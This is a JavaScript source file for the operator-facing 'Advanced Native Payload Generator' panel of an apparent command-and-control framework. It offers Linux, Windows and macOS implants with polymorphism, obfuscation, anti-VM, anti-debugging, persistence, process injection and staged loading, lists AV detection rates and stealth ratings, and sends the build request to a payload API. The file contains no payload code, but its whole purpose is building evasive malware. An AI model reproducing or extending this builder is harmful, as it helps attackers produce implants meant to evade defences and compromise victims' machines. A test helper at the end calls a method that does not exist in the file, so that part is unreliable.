/**
 * Native Payload Generation Interface
 * Advanced payload builder with polymorphic options
 */

class NativePayloadGenerator {
    constructor() {
        this.currentConfig = {
            type: 'native',
            platform: 'linux',
            c2_host: window.location.hostname,
            c2_port: 4433,
            obfuscation: true,
            polymorphic: true,
            staged: false
        };
        
        this.init();
    }
    
    init() {
        // Add native payload UI if not exists
        if (!document.getElementById('nativePayloadSection')) {
            this.injectUI();
        }
        
        this.bindEvents();
        this.updatePlatformInfo();
    }
    
    injectUI() {
        const payloadsSection = document.querySelector('#payloads-section') || 
                              document.querySelector('.content-section');
        
        if (!payloadsSection) return;
        
        const nativeUI = `
            <div id="nativePayloadSection" class="payload-builder-advanced">
                <h2>🚀 Advanced Native Payload Generator</h2>
                <div class="payload-tabs">
                    <button class="tab-btn active" data-tab="native">Native C/C++</button>
                    <button class="tab-btn" data-tab="python">Python</button>
                    <button class="tab-btn" data-tab="staged">Staged</button>
                </div>
                
                <div class="payload-config">
                    <div class="config-group">
                        <h3>Platform Configuration</h3>
                        <div class="platform-selector">
                            <label class="platform-option">
                                <input type="radio" name="platform" value="linux" checked>
                                <span class="platform-card">
                                    <i class="fab fa-linux"></i>
                                    <span>Linux</span>
                                    <small>ELF Binary</small>
                                </span>
                            </label>
                            <label class="platform-option">
                                <input type="radio" name="platform" value="windows">
                                <span class="platform-card">
                                    <i class="fab fa-windows"></i>
                                    <span>Windows</span>
                                    <small>PE Executable</small>
                                </span>
                            </label>
                            <label class="platform-option">
                                <input type="radio" name="platform" value="macos">
                                <span class="platform-card">
                                    <i class="fab fa-apple"></i>
                                    <span>macOS</span>
                                    <small>Mach-O</small>
                                </span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="config-group">
                        <h3>Connection Settings</h3>
                        <div class="config-inputs">
                            <div class="input-group">
                                <label>C2 Host/Domain</label>
                                <input type="text" id="nativeC2Host" value="${window.location.hostname}" 
                                       placeholder="c2.example.com or IP">
                            </div>
                            <div class="input-group">
                                <label>C2 Port</label>
                                <input type="number" id="nativeC2Port" value="4433" min="1" max="65535">
                            </div>
                        </div>
                    </div>
                    
                    <div class="config-group">
                        <h3>Evasion Options</h3>
                        <div class="evasion-options">
                            <label class="switch-option">
                                <input type="checkbox" id="enablePolymorphic" checked>
                                <span class="switch"></span>
                                <span>Polymorphic Code (Unique each build)</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enableObfuscation" checked>
                                <span class="switch"></span>
                                <span>String Obfuscation</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enableAntiVM" checked>
                                <span class="switch"></span>
                                <span>Anti-VM Detection</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enableAntiDebug" checked>
                                <span class="switch"></span>
                                <span>Anti-Debugging</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enablePacking">
                                <span class="switch"></span>
                                <span>UPX Packing (Smaller size)</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="config-group">
                        <h3>Advanced Features</h3>
                        <div class="advanced-options">
                            <label class="switch-option">
                                <input type="checkbox" id="enablePersistence">
                                <span class="switch"></span>
                                <span>Auto-Install Persistence</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enableInjection">
                                <span class="switch"></span>
                                <span>Process Injection Capability</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enableKillswitch">
                                <span class="switch"></span>
                                <span>Remote Killswitch</span>
                            </label>
                            <label class="switch-option">
                                <input type="checkbox" id="enableStaged">
                                <span class="switch"></span>
                                <span>Staged Loading (Smaller initial payload)</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="payload-stats">
                        <div class="stat-item">
                            <span class="stat-label">Estimated Size:</span>
                            <span class="stat-value" id="estimatedSize">15-20 KB</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Detection Rate:</span>
                            <span class="stat-value" id="detectionRate">Low (5-10%)</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Stealth Level:</span>
                            <span class="stat-value" id="stealthLevel">★★★★☆</span>
                        </div>
                    </div>
                    
                    <div class="build-actions">
                        <button id="buildNativePayload" class="btn btn-primary">
                            <i class="fas fa-hammer"></i> Build Native Payload
                        </button>
                        <button id="testPayload" class="btn btn-secondary">
                            <i class="fas fa-vial"></i> Test in Sandbox
                        </button>
                    </div>
                    
                    <div id="buildProgress" class="build-progress" style="display: none;">
                        <div class="progress-bar">
                            <div class="progress-fill"></div>
                        </div>
                        <div class="progress-steps">
                            <div class="step" data-step="compile">Compiling...</div>
                            <div class="step" data-step="obfuscate">Obfuscating...</div>
                            <div class="step" data-step="pack">Packing...</div>
                            <div class="step" data-step="sign">Signing...</div>
                        </div>
                    </div>
                    
                    <div id="buildResult" class="build-result" style="display: none;">
                        <h4>✅ Payload Generated Successfully!</h4>
                        <div class="result-details">
                            <div class="detail-row">
                                <span>Platform:</span>
                                <span id="resultPlatform"></span>
                            </div>
                            <div class="detail-row">
                                <span>Size:</span>
                                <span id="resultSize"></span>
                            </div>
                            <div class="detail-row">
                                <span>Hash:</span>
                                <span id="resultHash" class="mono"></span>
                            </div>
                        </div>
                        <div class="download-actions">
                            <button id="downloadPayload" class="btn btn-success">
                                <i class="fas fa-download"></i> Download Payload
                            </button>
                            <button id="generateStager" class="btn btn-info">
                                <i class="fas fa-code"></i> Generate Stager
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        // Add CSS if not exists
        if (!document.getElementById('nativePayloadStyles')) {
            const styles = `
                <style id="nativePayloadStyles">
                    .payload-builder-advanced {
                        padding: 20px;
                        background: var(--card-bg);
                        border-radius: 12px;
                        margin: 20px 0;
                    }
                    
                    .payload-tabs {
                        display: flex;
                        gap: 10px;
                        margin-bottom: 20px;
                        border-bottom: 2px solid var(--border-color);
                    }
                    
                    .tab-btn {
                        padding: 10px 20px;
                        background: transparent;
                        border: none;
                        color: var(--text-secondary);
                        cursor: pointer;
                        transition: all 0.3s;
                        position: relative;
                    }
                    
                    .tab-btn.active {
                        color: var(--primary-color);
                    }
                    
                    .tab-btn.active::after {
                        content: '';
                        position: absolute;
                        bottom: -2px;
                        left: 0;
                        right: 0;
                        height: 2px;
                        background: var(--primary-color);
                    }
                    
                    .platform-selector {
                        display: grid;
                        grid-template-columns: repeat(3, 1fr);
                        gap: 15px;
                        margin: 15px 0;
                    }
                    
                    .platform-option input {
                        display: none;
                    }
                    
                    .platform-card {
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        padding: 20px;
                        border: 2px solid var(--border-color);
                        border-radius: 8px;
                        cursor: pointer;
                        transition: all 0.3s;
                    }
                    
                    .platform-option input:checked + .platform-card {
                        border-color: var(--primary-color);
                        background: rgba(76, 175, 80, 0.1);
                    }
                    
                    .platform-card i {
                        font-size: 32px;
                        margin-bottom: 10px;
                    }
                    
                    .platform-card small {
                        color: var(--text-secondary);
                        font-size: 12px;
                    }
                    
                    .config-group {
                        margin: 25px 0;
                    }
                    
                    .config-group h3 {
                        margin-bottom: 15px;
                        color: var(--text-primary);
                    }
                    
                    .config-inputs {
                        display: grid;
                        grid-template-columns: 2fr 1fr;
                        gap: 15px;
                    }
                    
                    .switch-option {
                        display: flex;
                        align-items: center;
                        margin: 10px 0;
                        cursor: pointer;
                    }
                    
                    .switch {
                        position: relative;
                        display: inline-block;
                        width: 50px;
                        height: 24px;
                        background: var(--border-color);
                        border-radius: 12px;
                        margin-right: 12px;
                        transition: 0.3s;
                    }
                    
                    .switch::after {
                        content: '';
                        position: absolute;
                        width: 20px;
                        height: 20px;
                        background: white;
                        border-radius: 50%;
                        top: 2px;
                        left: 2px;
                        transition: 0.3s;
                    }
                    
                    .switch-option input:checked + .switch {
                        background: var(--primary-color);
                    }
                    
                    .switch-option input:checked + .switch::after {
                        transform: translateX(26px);
                    }
                    
                    .payload-stats {
                        display: grid;
                        grid-template-columns: repeat(3, 1fr);
                        gap: 20px;
                        padding: 20px;
                        background: rgba(0, 0, 0, 0.2);
                        border-radius: 8px;
                        margin: 20px 0;
                    }
                    
                    .stat-item {
                        text-align: center;
                    }
                    
                    .stat-label {
                        display: block;
                        color: var(--text-secondary);
                        font-size: 12px;
                        margin-bottom: 5px;
                    }
                    
                    .stat-value {
                        display: block;
                        font-size: 18px;
                        font-weight: bold;
                        color: var(--primary-color);
                    }
                    
                    .build-progress {
                        margin: 20px 0;
                    }
                    
                    .progress-bar {
                        height: 4px;
                        background: var(--border-color);
                        border-radius: 2px;
                        overflow: hidden;
                    }
                    
                    .progress-fill {
                        height: 100%;
                        background: var(--primary-color);
                        width: 0%;
                        transition: width 0.5s;
                    }
                    
                    .progress-steps {
                        display: flex;
                        justify-content: space-between;
                        margin-top: 10px;
                    }
                    
                    .step {
                        color: var(--text-secondary);
                        font-size: 12px;
                    }
                    
                    .step.active {
                        color: var(--primary-color);
                        font-weight: bold;
                    }
                    
                    .build-result {
                        padding: 20px;
                        background: rgba(76, 175, 80, 0.1);
                        border: 2px solid var(--primary-color);
                        border-radius: 8px;
                        margin: 20px 0;
                    }
                    
                    .result-details {
                        margin: 15px 0;
                    }
                    
                    .detail-row {
                        display: flex;
                        justify-content: space-between;
                        margin: 8px 0;
                        padding: 5px 0;
                        border-bottom: 1px solid rgba(255,255,255,0.1);
                    }
                    
                    .mono {
                        font-family: 'Courier New', monospace;
                        font-size: 12px;
                    }
                </style>
            `;
            document.head.insertAdjacentHTML('beforeend', styles);
        }
        
        payloadsSection.insertAdjacentHTML('afterbegin', nativeUI);
    }
    
    bindEvents() {
        // Platform selection
        document.querySelectorAll('input[name="platform"]').forEach(radio => {
            radio.addEventListener('change', () => {
                this.currentConfig.platform = radio.value;
                this.updatePlatformInfo();
            });
        });
        
        // Build button
        const buildBtn = document.getElementById('buildNativePayload');
        if (buildBtn) {
            buildBtn.addEventListener('click', () => this.buildPayload());
        }
        
        // Download button
        const downloadBtn = document.getElementById('downloadPayload');
        if (downloadBtn) {
            downloadBtn.addEventListener('click', () => this.downloadPayload());
        }
    }
    
    updatePlatformInfo() {
        const platform = this.currentConfig.platform;
        const sizeEl = document.getElementById('estimatedSize');
        const detectionEl = document.getElementById('detectionRate');
        const stealthEl = document.getElementById('stealthLevel');
        
        if (!sizeEl) return;
        
        const info = {
            linux: {
                size: '15-20 KB',
                detection: 'Low (5-10%)',
                stealth: '★★★★☆'
            },
            windows: {
                size: '18-25 KB',
                detection: 'Medium (10-20%)',
                stealth: '★★★☆☆'
            },
            macos: {
                size: '20-30 KB',
                detection: 'Low (5-15%)',
                stealth: '★★★★☆'
            }
        };
        
        sizeEl.textContent = info[platform].size;
        detectionEl.textContent = info[platform].detection;
        stealthEl.textContent = info[platform].stealth;
    }
    
    async buildPayload() {
        const progressEl = document.getElementById('buildProgress');
        const resultEl = document.getElementById('buildResult');
        
        // Show progress
        progressEl.style.display = 'block';
        resultEl.style.display = 'none';
        
        // Animate progress
        this.animateProgress();
        
        // Collect configuration
        this.currentConfig = {
            type: 'native',
            platform: document.querySelector('input[name="platform"]:checked').value,
            bind_host: document.getElementById('nativeC2Host').value,
            bind_port: parseInt(document.getElementById('nativeC2Port').value),
            polymorphic: document.getElementById('enablePolymorphic').checked,
            obfuscation: document.getElementById('enableObfuscation').checked,
            antivm: document.getElementById('enableAntiVM').checked,
            antidebug: document.getElementById('enableAntiDebug').checked,
            packing: document.getElementById('enablePacking').checked,
            persistence: document.getElementById('enablePersistence').checked,
            injection: document.getElementById('enableInjection').checked,
            killswitch: document.getElementById('enableKillswitch').checked,
            staged: document.getElementById('enableStaged').checked
        };
        
        try {
            // Make API request
            const response = await fetch('/api/generate-payload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify(this.currentConfig)
            });
            
            const data = await response.json();
            
            if (data.success) {
                this.showResult(data);
            } else {
                this.showError(data.error || 'Build failed');
            }
        } catch (error) {
            this.showError(error.message);
        }
    }
    
    animateProgress() {
        const steps = ['compile', 'obfuscate', 'pack', 'sign'];
        const progressFill = document.querySelector('.progress-fill');
        let currentStep = 0;
        
        const interval = setInterval(() => {
            if (currentStep >= steps.length) {
                clearInterval(interval);
                return;
            }
            
            // Update progress bar
            progressFill.style.width = ((currentStep + 1) / steps.length * 100) + '%';
            
            // Update step status
            document.querySelectorAll('.step').forEach((step, index) => {
                if (index <= currentStep) {
                    step.classList.add('active');
                }
            });
            
            currentStep++;
        }, 1000);
        
        setTimeout(() => clearInterval(interval), 5000);
    }
    
    showResult(data) {
        const progressEl = document.getElementById('buildProgress');
        const resultEl = document.getElementById('buildResult');
        
        progressEl.style.display = 'none';
        resultEl.style.display = 'block';
        
        // Update result details
        document.getElementById('resultPlatform').textContent = data.platform;
        document.getElementById('resultSize').textContent = this.formatSize(data.payload_size);
        document.getElementById('resultHash').textContent = data.hash ? 
            data.hash.substring(0, 16) + '...' : 'N/A';
        
        // Store download URL
        this.downloadUrl = data.download_url;
    }
    
    showError(message) {
        const progressEl = document.getElementById('buildProgress');
        progressEl.style.display = 'none';
        
        // Show error notification
        this.showNotification('Build failed: ' + message, 'error');
    }
    
    async downloadPayload() {
        if (!this.downloadUrl) return;
        
        window.location.href = this.downloadUrl;
    }
    
    formatSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    }
    
    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.textContent = message;
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.classList.add('show');
        }, 100);
        
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }
    
    // Public method for testing
    generatePayload() {
        // Trigger the build process
        const button = document.querySelector('.build-button');
        if (button) {
            button.click();
        } else {
            this.handleBuild();
        }
    }
}

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.nativePayloadGen = new NativePayloadGenerator();
    });
} else {
    window.nativePayloadGen = new NativePayloadGenerator();
}